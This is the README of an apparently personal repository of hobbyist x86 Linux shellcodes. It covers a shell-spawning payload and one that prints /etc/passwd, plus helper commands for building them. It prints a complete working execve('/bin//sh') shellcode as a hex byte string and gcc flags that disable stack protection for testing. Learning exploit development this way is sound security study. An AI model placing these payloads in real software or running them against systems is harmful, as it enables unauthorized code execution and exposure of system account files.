Some Shellcodes
====
These are some shellcodes that i did in my free time.


# 1. 'sh' shell shellcode
Spawn a 'sh' shell.
[`README`](sh_shell/README.md)

# 2. 'cat /etc/passwd' file shellcode
Print the content of /etc/passwd file.
[`README`](etc_passwd/README.md)


Helper tools/commands
====
Use cmd_hex.py file to generate sequence of pushes for the command string by padding it it appropriately.

ex.

<pre>
$ python cmd_hex.py   
String:/bin/bash
Length 12
push 0x68736162		;hsab
push 0x2f6e6962		;/nib
push 0x2f2f2f2f		;////
</pre>

# Compiling
Use 'compile_link.sh' shell script to compile the asm files.

ex. to compile and link 'sh_shell.asm' file
<pre>
$ compile_link.sh shellcode_sh
</pre>

# Generate shellcodes from linked file

<pre>
objdump -d ./shellcode_sh | grep '[0-9a-f]:'|grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' '| sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/'
</pre>

ex. for 'shellcode_sh'

<pre>
"\x31\xc0\x50\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
</pre>


Use the skeleton 'shellTest.c' file to test the shellcodes. Compile the c file using

<pre>
gcc -m32 -z execstack shellTest.c -o shellTest
</pre>

Final Note
=====
I am still learning coding shellcodes so i will be adding more shellcodes as i progress.

Author
====
Arun Kumar Shreevastava
